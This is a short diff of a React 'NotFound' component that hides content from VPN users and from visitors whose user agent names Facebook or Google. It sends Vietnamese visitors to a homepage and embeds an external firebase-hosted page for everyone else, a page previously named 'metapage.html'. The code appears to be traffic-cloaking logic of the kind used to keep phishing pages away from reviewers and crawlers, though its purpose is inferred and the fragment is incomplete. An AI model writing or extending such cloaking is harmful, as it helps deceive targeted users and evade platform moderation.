@@ -38,10 +38,10 @@ function NotFound() {
         if(privacy){
           if(
             privacy.vpn == true
-           //|| privacy.hosting == true
-           //|| privacy.relay == true
-          // || privacy.tor == true
-          // || privacy.proxy == true
+          //  || privacy.hosting == true
+          //  || privacy.relay == true
+          //  || privacy.tor == true
+          //  || privacy.proxy == true
           ){
             SetUserHiden(true);
           }
@@ -53,14 +53,9 @@ function NotFound() {
     }
   };
 
-  // useEffect(() => {
-  //   fetchHtml();
-  // }, []);
-
   useEffect(() => {
     setLocaltion();
   }, []);
-
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
@@ -79,7 +74,7 @@ function NotFound() {
         if(countryCode.includes('vn')){
           return(showIframe("homepage.html"));
         }else{
-            return(showIframe("metapage.html"));
+          return(showIframe("https://testing-app-42e59.web.app"));
         }
       }
     }
